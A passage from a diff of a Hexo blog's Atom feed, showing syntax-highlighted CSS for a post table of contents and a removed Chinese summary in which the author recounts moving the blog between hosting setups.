class="attribute">top</span>: <span class="number">25%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.post-poc</span>&#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.post-poc-child</span>&#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK至此就大功告成啦~效果就像这篇博客的这种~。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;废话&quot;&gt;&lt;a href=&quot;#废话&quot; class=&quot;headerlink&quot; title=&quot;废话&quot;&gt;&lt;/a&gt;废话&lt;/h1&gt;&lt;p&gt;博客从大一就搭了，方案从github pages+hexo换到WordPress再到现在hexo+vultr，但博客却一直没有时间写。当初搭
-      
-    
-    </summary>
-    
-    
-      <category term="捣鼓" scheme="http://lxzmads.github.io/tags/%E6%8D%A3%E9%BC%93/"/>
     
   </entry>
   
